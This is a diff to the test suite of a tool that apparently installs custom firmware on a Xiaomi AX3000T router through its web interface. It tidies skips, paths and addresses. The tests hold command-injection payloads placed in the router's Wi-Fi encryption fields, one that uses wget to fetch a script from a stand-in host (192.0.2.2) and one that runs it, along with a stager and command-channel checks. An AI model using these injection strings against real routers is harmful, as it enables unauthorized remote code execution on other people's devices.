@@ -28,6 +28,7 @@ import tempfile
 import threading
 import time
 import urllib.parse
+from unittest import mock
 
 import chain
 import channel
@@ -36,12 +37,21 @@ import release
 import probe
 import ubiparse
 
-PASS, FAIL = [], []
+REPO_ROOT = os.path.dirname(os.path.abspath(__file__))
+NAND_SUPPORT_FIXTURE = os.path.join(
+    REPO_ROOT, "testdata", "nand-support-v1.7.txt")
+
+PASS, FAIL, SKIP = [], [], []
 
 
 def check(name, cond, detail=""):
     (PASS if cond else FAIL).append(name)
     print(f"  [{'ok' if cond else 'FAIL'}] {name}{(' -- ' + detail) if detail else ''}")
+
+
+def skip(name, detail=""):
+    SKIP.append(name)
+    print(f"  [skip] {name}{(' -- ' + detail) if detail else ''}")
 
 
 def test_profiles():
@@ -106,12 +116,12 @@ def test_firstboot_configuration():
 
         archive = os.path.join(root, "wifi.tar.gz")
         install.build_config_tar(
-            archive, "Bench", "ExamplePass123", devices.RD03V2,
+            archive, "ExampleNetwork", "ExamplePass123", devices.RD03V2,
             country="BR")
         with tarfile.open(archive) as tf:
             body = tf.extractfile(tf.getmembers()[0]).read().decode()
         check("Wi-Fi archive enables only explicit valid configuration",
-              "ssid='Bench'" in body and "key='ExamplePass123'" in body
+              "ssid='ExampleNetwork'" in body and "key='ExamplePass123'" in body
               and "country='BR'" in body)
 
         rejected = 0
@@ -233,8 +243,9 @@ def test_resume_manifest_and_flash_guards():
               "xiaomi-sysupgrade.ack" in launcher
               and launcher.index("xiaomi-sysupgrade.ack")
               < launcher.index("exec /sbin/sysupgrade"))
-        check("hostname peers normalize to numeric addresses",
-              channel.normalize_peer("localhost") == "127.0.0.1")
+        with mock.patch("socket.gethostbyname", return_value="127.0.0.42"):
+            check("hostname peers normalize to numeric addresses",
+                  channel.normalize_peer("router.test") == "127.0.0.42")
     finally:
         shutil.rmtree(root, ignore_errors=True)
 
@@ -275,7 +286,7 @@ def test_stager():
     }
     for label, restore in cases.items():
         blob = channel.build_stager(
-            "192.168.31.231", 8000, 4444, restore, "testtoken")
+            "192.0.2.2", 8000, 4444, restore, "testtoken")
         with tempfile.NamedTemporaryFile("wb", suffix=".sh", delete=False) as fh:
             fh.write(blob)
             path = fh.name
@@ -323,7 +334,7 @@ def _fake_device(shell_port, workdir, token):
 def test_channel():
     print("\n== command channel ==")
     if not shutil.which("busybox"):
-        check("busybox present", False, "skipping channel test")
+        skip("command channel", "BusyBox is not installed")
         return
     def free_port():
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as probe_socket:
@@ -798,11 +809,11 @@ def test_http_flow():
               str(bands))
         check("open AP reported as such", bands[0]["encryption"] == "none")
 
-        chain.plant(host, stok, "192.168.31.231", 8000, bands)
+        chain.plant(host, stok, "192.0.2.2", 8000, bands)
         enc24 = _MiWiFi.state["bands"][0]["encryption"]
         enc5 = _MiWiFi.state["bands"][1]["encryption"]
         check("2.4G carries the fetch stage",
-              enc24 == '\\" wget http://192.168.31.231:8000/s -O /tmp/x #', enc24)
+              enc24 == '\\" wget http://192.0.2.2:8000/s -O /tmp/x #', enc24)
         check("5G carries the exec stage", enc5 == '\\" sh /tmp/x #', enc5)
         check("SSIDs preserved through the plant",
               _MiWiFi.state["bands"][0]["ssid"] == "Xiaomi_ABCD")
@@ -815,7 +826,7 @@ def test_http_flow():
         _MiWiFi.state["bands"][0]["encryption"] = "none"
         _MiWiFi.state["bands"][1]["encryption"] = "none"
         try:
-            chain.plant(host, stok, "192.168.31.231", 8000, bands)
+            chain.plant(host, stok, "192.0.2.2", 8000, bands)
             check("a filtered plant aborts before the trigger", False)
         except chain.ChainError as e:
             check("a filtered plant aborts before the trigger",
@@ -837,7 +848,7 @@ def test_facts_commands():
     """
     print("\n== probe battery ==")
     if not shutil.which("busybox"):
-        check("busybox present", False, "skipping")
+        skip("probe command syntax", "BusyBox is not installed")
         return
     for key, _desc, cmd in probe.FACTS:
         # a newline inside a command would be read as its own shell line and
@@ -1095,7 +1106,7 @@ def _v17_release(with_nand_file=True):
     if with_nand_file:
         assets.append({
             "name": "nand-support.txt", "browser_download_url": "http://x/",
-            "size": os.path.getsize("testdata/nand-support-v1.7.txt")})
+            "size": os.path.getsize(NAND_SUPPORT_FIXTURE)})
     return release.Release({"tag_name": "v1.7", "published_at": "2026-08-14T16:48:40Z",
                             "assets": assets})
 
@@ -1132,7 +1143,7 @@ def test_v17_nand_support():
         rel = _v17_release()
         tagged = release.cache_dir(rel, d)
         os.makedirs(tagged)
-        shutil.copy("testdata/nand-support-v1.7.txt",
+        shutil.copy(NAND_SUPPORT_FIXTURE,
                     os.path.join(tagged, "nand-support.txt"))
         # download() short-circuits on a present file of the declared size, so
         # this parses the real published asset with no network.
@@ -1250,14 +1261,17 @@ def test_tagged_revert_cache():
 
 def test_stock_image():
     """Carve and validate the real Xiaomi image, if it is present."""
-    import glob
-    cand = glob.glob("/home/agiu/ax3000t-firmware/miwifi_rd03v2_*.bin")
-    if not cand:
+    image = os.environ.get("XIAOMI_STOCK_IMAGE")
+    if not image:
+        skip("stock image carve", "set XIAOMI_STOCK_IMAGE to enable")
+        return
+    if not os.path.isfile(image):
+        check("stock image path exists", False, image)
         return
     import restore
     print("\n== stock image carve ==")
     profile = devices.RD03V2
-    payload, digest, known = restore.carve(cand[0], profile)
+    payload, digest, known = restore.carve(image, profile)
     check("hash is a published one", bool(known), str(known))
     check("payload is a whole number of PEBs",
           len(payload) % profile.peb_size == 0)
@@ -1355,7 +1369,8 @@ def main():
     test_stock_image()
     test_expected_volume()
     test_channel()
-    print(f"\n{len(PASS)} passed, {len(FAIL)} failed in {time.time() - t0:.1f}s")
+    print(f"\n{len(PASS)} passed, {len(FAIL)} failed, {len(SKIP)} skipped "
+          f"in {time.time() - t0:.1f}s")
     if FAIL:
         print("failed: " + ", ".join(FAIL))
     return 1 if FAIL else 0
